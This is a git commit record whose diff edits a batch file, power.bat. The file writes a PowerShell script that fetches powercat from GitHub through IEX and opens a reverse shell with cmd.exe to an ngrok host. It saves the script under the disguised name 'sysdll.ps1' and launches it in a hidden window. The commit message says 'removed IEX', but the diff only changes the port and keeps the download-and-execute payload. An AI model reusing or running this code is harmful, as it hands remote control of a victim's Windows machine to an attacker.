a0ba742bc3ee7345ffcf811ec9a9f1e277fb9e81
Nick Plotits <kit.plotits@gmail.com>
2020-02-15 18:24:00 +0200

    removed IEX

--- power.bat
+++ power.bat
@@ -1,4 +1,4 @@
-echo IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");(powercat -c 0.tcp.ngrok.io -p 12823 -e "C:\Windows\System32\cmd.exe") > C:\users\public\Documents\sysdll.ps1
+echo IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");(powercat -c 0.tcp.ngrok.io -p 11674 -e "C:\Windows\System32\cmd.exe") > C:\users\public\Documents\sysdll.ps1
 cd C:\users\public\Documents\
 echo start-process PowerShell.exe -arg $pwd\sysdll.ps1 -WindowStyle Hidden > C:\users\public\Documents\sysdll2.ps1
 Powershell.exe -executionpolicy remotesigned -File  sysdll2.ps1
